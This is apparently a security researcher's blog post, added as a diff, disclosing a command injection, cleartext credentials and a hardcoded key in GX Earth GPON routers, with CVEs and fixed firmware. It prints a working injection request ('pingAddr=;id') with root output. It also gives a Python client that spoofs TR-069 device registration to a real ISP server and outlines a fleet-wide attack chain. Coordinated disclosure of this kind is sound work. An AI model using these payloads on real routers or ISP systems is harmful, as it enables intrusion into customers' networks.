@@ -1,0 +1,163 @@
+<!-- POSTMETA {"title": "Multiple Vulnerabilities in GX Earth GPON Routers (CVE-2026-45431/45432/45433)", "slug": "gpon-router-vulnerabilities", "date": "2026-08-08", "tags": ["research", "hardware", "gpon", "cve"], "excerpt": "A writeup of the command injection, cleartext credential exposure, and hardcoded key issues I found in the GX Earth 2022 ONT and reported through CERT-In."} -->
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'none'; upgrade-insecure-requests">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <meta name="color-scheme" content="light dark">
+  <meta name="description" content="A writeup of the command injection, cleartext credential exposure, and hardcoded key issues I found in the GX Earth 2022 ONT and reported through CERT-In.">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Multiple Vulnerabilities in GX Earth GPON Routers (CVE-2026-45431/45432/45433)">
+  <meta property="og:description" content="A writeup of the command injection, cleartext credential exposure, and hardcoded key issues I found in the GX Earth 2022 ONT and reported through CERT-In.">
+  <meta property="og:url" content="https://blog.anmolbakshi.com/posts/gpon-router-vulnerabilities.html">
+  <title>Multiple Vulnerabilities in GX Earth GPON Routers (CVE-2026-45431/45432/45433) — The Dispatch · Anmol Bakshi</title>
+  <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../assets/fonts.css">
+  <link rel="stylesheet" href="../assets/style.css">
+  <link rel="alternate" type="application/rss+xml" title="The Dispatch" href="../feed.xml">
+  <script src="../assets/theme.js"></script>
+  <script src="../assets/app.js" defer></script>
+</head>
+<body>
+  <div class="frame">
+    <span class="corner tl"></span><span class="corner tr"></span>
+    <span class="corner bl"></span><span class="corner br"></span>
+
+    <header class="site-head">
+      <a class="badge" href="../index.html">Dispatch · A.B.</a>
+      <p class="head-title">Anmol Bakshi — Field notes</p>
+      <div class="head-right">
+        <button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle dark mode">
+          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg>
+          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>
+        </button>
+        <span class="mono"><span class="status-dot"></span>Filed · 08 AUG 2026</span>
+        <a class="head-link" href="../index.html">Archive →</a>
+      </div>
+    </header>
+
+    <div class="ticker mono">
+      <span>Entry · № 02 / 02</span>
+      <span class="sep">●</span>
+      <span>Classification · Public</span>
+      <span class="sep">●</span>
+      <span>Filed · 08 AUG 2026</span>
+    </div>
+
+    <article>
+      <header class="post-head">
+        <p class="post-kicker mono">File · RESEARCH · HARDWARE · GPON · CVE</p>
+        <h1>Multiple Vulnerabilities in GX Earth GPON Routers (CVE-2026-45431/45432/45433)</h1>
+        <p class="standfirst">A writeup of the command injection, cleartext credential exposure, and hardcoded key issues I found in the GX Earth 2022 ONT and reported through CERT-In.</p>
+        <div class="post-byline mono">
+          <span>By Anmol Bakshi</span>
+          <span>08 AUG 2026 · research / hardware / gpon / cve</span>
+        </div>
+      </header>
+
+      <div class="article">
+<p>I spend a fair amount of time looking at consumer networking gear, and the router your ISP hands you is usually a good place to start. It's rarely audited, often runs old software, and sits at the edge of a large managed network. Mine was a GX Earth 2022 GPON ONT deployed by Asianet Broadband, so I pulled the firmware and started reading.</p>
+<p>This post covers what I found: an authenticated command injection that gives root, credentials transmitted in cleartext, a hardcoded private key shared across devices, and, beyond the three CVEs, a set of shared ISP management accounts and a permissive TR-069 provisioning setup. All testing was done on my own device. Where the trail led toward ISP infrastructure that wasn't mine, I stopped and documented it for disclosure.</p>
+<h2>The device</h2>
+<p>The GX Earth 2022 is a dual-band GPON optical network terminal built by GX Group and deployed by Asianet to residential customers. Mine ran firmware <code>E2022-3.1.2A</code>, served its web UI from Boa/0.93.15, and used TR-069/CWMP for remote management by the ISP.</p>
+<p><img src="../assets/images/gpon-workbench-chai.jpg" alt="The workbench: GPON ONT opened up, soldering iron hot, masala chai mandatory" loading="lazy"></p>
+<hr>
+<h2>Command injection in the diagnostics page</h2>
+<p>Router diagnostic tools are a common source of command injection because they shell out to system binaries like <code>ping</code> and <code>traceroute</code>, and the input often isn't sanitized. This device was a good example.</p>
+<p>The IPv4 ping endpoint had input validation. The IPv6 ping and both traceroute endpoints did not:</p>
+<pre><code>POST /boaform/formPing6
+POST /boaform/formTracert
+POST /boaform/formTracert6</code></pre>
+<p>The <code>pingAddr</code> parameter was passed to a shell without sanitization. A semicolon and an appended command was enough:</p>
+<pre><code>POST /boaform/formPing6 HTTP/1.1
+Host: 192.168.1.1
+Authorization: Basic [credentials]
+Content-Type: application/x-www-form-urlencoded
+
+pingAddr=;id&amp;wanif=65535&amp;submit-url=/admin/ping6.asp</code></pre>
+<p>Response:</p>
+<pre><code>uid=0(Asianet) gid=0</code></pre>
+<p>Root, because the Boa web server itself runs as UID 0. From there I could read <code>/etc/shadow</code>, dump the filesystem, extract config files, and establish persistence. The same injection worked on the traceroute endpoints (<code>;ls /</code> returned the root directory listing).</p>
+<p>The detail worth noting is that IPv4 ping was patched and the other three endpoints weren't. That points to a fix applied to one handler without checking for the same pattern elsewhere, the kind of incomplete remediation that leaves the bug class open while creating the impression it was handled.</p>
+<p>This is <strong>CVE-2026-45431</strong> (CWE-78, OS command injection), CVSS 4.0 score <strong>8.7 (HIGH)</strong>, vector <code>CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code>.</p>
+<hr>
+<h2>Hardcoded credentials in the firmware</h2>
+<p>With RCE confirmed, I went back to the extracted firmware and grepped for credentials. <code>/etc/config_default.xml</code> contained hardcoded super-admin and web-admin passwords, a <code>user:user</code> account, a static GPON PLOAM password, a fixed WPS PIN, and a CWMP certificate password. None of these are unique per device; they're identical across every unit running this firmware, so extracting them from one router yields them for all of them.</p>
+<p>The actual values are in the disclosure and aren't reproduced here.</p>
+<hr>
+<h2>Shared ISP management accounts</h2>
+<p>The running config was more interesting than the firmware defaults. Using the command injection, I dumped <code>/var/config/config.xml</code> from my live device. Alongside the factory defaults was a second set of accounts provisioned by the ISP: a NOC access account, an ISP super-admin account, and the TR-069 connection-request and ACS credentials.</p>
+<p>An ISP holding a management account on customer equipment is normal. The problem is that the same account is provisioned to every device. A single credential leak, via the RCE above for instance, doesn't compromise one router, it compromises the entire deployed base. This is the same shared-credential weakness that made mass IoT compromises like Mirai possible.</p>
+<hr>
+<h2>TR-069: cleartext credentials and permissive provisioning</h2>
+<p>TR-069 is the protocol ISPs use to manage CPE at scale. The router checks in with an Auto Configuration Server (ACS), here <code>cwmp.asianetdigital.net:8088</code>, which returns provisioning, configuration, and firmware instructions. Two issues stood out, both confirmable without touching anything but my own device.</p>
+<p>First, the traffic was plain HTTP. The web management interface and the TR-069 exchange both put credentials on the wire in cleartext, so anyone able to observe the traffic can capture authentication material. This is <strong>CVE-2026-45432</strong> (CWE-319, cleartext transmission of sensitive information), CVSS 4.0 score <strong>8.7 (HIGH)</strong>, vector <code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N</code>.</p>
+<p>Second, the provisioning model was permissive. To see how the ACS identified a device, I wrote a small TR-069 client that sends an <code>Inform</code> (the boot-time registration message) with fabricated device identifiers:</p>
+<pre><code>#!/usr/bin/env python3
+import requests
+
+URL = &quot;http://cwmp.asianetdigital.net:8088/&quot;
+AUTH = (&quot;ASIANET&quot;, &quot;[REDACTED]&quot;)
+OUI = &quot;00259E&quot;            # a real Huawei OUI
+SERIAL = &quot;00259E123456&quot;   # invented
+
+inform = f&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;
+               xmlns:cwmp=&quot;urn:dslforum-org:cwmp-1-2&quot;&gt;
+  &lt;soap:Body&gt;
+    &lt;cwmp:Inform&gt;
+      &lt;DeviceId&gt;
+        &lt;Manufacturer&gt;Huawei&lt;/Manufacturer&gt;
+        &lt;OUI&gt;{OUI}&lt;/OUI&gt;
+        &lt;ProductClass&gt;HG8245H&lt;/ProductClass&gt;
+        &lt;SerialNumber&gt;{SERIAL}&lt;/SerialNumber&gt;
+      &lt;/DeviceId&gt;
+      &lt;Event&gt;
+        &lt;EventStruct&gt;&lt;EventCode&gt;0 BOOTSTRAP&lt;/EventCode&gt;&lt;/EventStruct&gt;
+      &lt;/Event&gt;
+    &lt;/cwmp:Inform&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;&#x27;&#x27;&#x27;
+
+s = requests.Session()
+s.auth = AUTH
+r = s.post(URL, headers={&quot;Content-Type&quot;: &quot;text/xml&quot;}, data=inform)
+print(f&quot;status: {r.status_code}&quot;)</code></pre>
+<p>The ACS accepted the registration despite the invented serial number. It performed no certificate-based authentication and validated nothing against a device whitelist as long as the OUI belonged to a recognized manufacturer, then returned configuration including the shared connection-request credentials. I tested a few Huawei OUIs to confirm the behavior and stopped there. Continuing would have meant interacting with production infrastructure that isn't mine.</p>
+<hr>
+<h2>Hardcoded TLS private key</h2>
+<p><code>/etc/ssl_key.pem</code> holds the RSA private key the device uses for HTTPS to its own web interface (subject <code>CN=192.168.1.1, O=realtek, C=CN</code>, self-signed), and it is identical across devices. A key shipped in firmware isn't secret: extract it once and you can decrypt HTTPS management traffic for any device using it, or run a MITM against an admin session. This is <strong>CVE-2026-45433</strong> (CWE-321, use of a hardcoded cryptographic key), CVSS 4.0 score <strong>8.7 (HIGH)</strong>, vector <code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N</code>.</p>
+<hr>
+<h2>Combined impact</h2>
+<p>Individually these are standard findings. Together, and given the shared credentials, they scale to the whole deployment.</p>
+<p>The chain is straightforward: enumerate the ISP ranges for the TR-069 port to identify live routers, then use the shared credentials (recovered from a single device via RCE) to reach any of them. From there an attacker can extract per-customer WiFi keys, PPPoE logins, and admin passwords; change DNS to redirect traffic; hijack the ACS URL for control that survives reboots; or push firmware. Because the credentials are shared, this automates across the fleet rather than one device at a time. Persistence is the notable part: an ACS-URL hijack survives a reboot, and a firmware-level change survives a factory reset.</p>
+<hr>
+<h2>Disclosure and CVEs</h2>
+<p>I reported this to NCIIPC on 28 December 2024. It went through coordinated disclosure with CERT-In, the vendor released fixed firmware, and the advisory and CVEs were published on 4 June 2026.</p>
+<p><strong>CERT-In advisory:</strong> <a href="https://www.cert-in.org.in/s2cMainServlet?pageid=PUBVLNOTES01&amp;amp;VLCODE=CIVN-2026-0288" rel="noopener noreferrer">CIVN-2026-0288: Multiple Vulnerabilities in GX Earth ONT Models</a></p>
+<table><thead><tr><th>CVE</th><th>Issue</th><th>CWE</th><th>CVSS 4.0</th></tr></thead><tbody><tr><td><a href="https://www.cve.org/CVERecord?id=CVE-2026-45431" rel="noopener noreferrer">CVE-2026-45431</a></td><td>Command injection (root RCE)</td><td>CWE-78</td><td>8.7 (HIGH)</td></tr><tr><td><a href="https://www.cve.org/CVERecord?id=CVE-2026-45432" rel="noopener noreferrer">CVE-2026-45432</a></td><td>Cleartext transmission of credentials</td><td>CWE-319</td><td>8.7 (HIGH)</td></tr><tr><td><a href="https://www.cve.org/CVERecord?id=CVE-2026-45433" rel="noopener noreferrer">CVE-2026-45433</a></td><td>Hardcoded RSA private key</td><td>CWE-321</td><td>8.7 (HIGH)</td></tr></tbody></table>
+<p>Affected models per the advisory: <strong>GX Earth 2022</strong> (<code>E2022-3.1.2A</code>, <code>3.1.5AV</code>, <code>1.1ASL</code>) and <strong>GX Earth 1010</strong> (<code>E1010-1.1ASL</code>). The three CVEs cover the command injection, cleartext credential transmission, and hardcoded key. The hardcoded firmware defaults, shared ISP accounts, and permissive ACS registration were part of the same report and informed the vendor's fix, but weren't assigned individual identifiers.</p>
+<p><strong>Fixed firmware:</strong> upgrade the GX Earth 2022 to <code>E2022-3.1.5A</code>, <code>E2022-3.1.8AV</code>, or <code>E2022-1.2ASL</code>, and the GX Earth 1010 to <code>E1010-1.2ASL</code>.</p>
+<hr>
+<h2>Notes</h2>
+<p>A few takeaways. Fix the vulnerability class rather than the single instance; the patched IPv4 ping next to three unpatched endpoints is a good example of what happens otherwise. On CPE specifically, per-device credentials matter more than almost anything else in the config, because a shared secret turns one compromise into a fleet-wide one. And ISP-provided routers are worth examining precisely because they're rarely looked at; this started as curiosity about my own device.</p>
+      </div>
+
+      <div class="fig-rule mono"><span>End of entry № 02</span><span>Fig. 02</span></div>
+
+      <nav class="post-nav" aria-label="More entries">
+        <span><a href="welcome-to-the-blog-what-to-expect.html">← Welcome to the Blog: What to Expect</a></span>
+        <a href="../index.html">Index</a>
+        <span></span>
+      </nav>
+    </article>
+
+    <footer class="site-foot mono">
+      <span>© 2026 Anmol Bakshi</span>
+      <span><a href="https://anmolbakshi.com" rel="me">Main dossier →</a></span>
+    </footer>
+  </div>
+</body>
+</html>
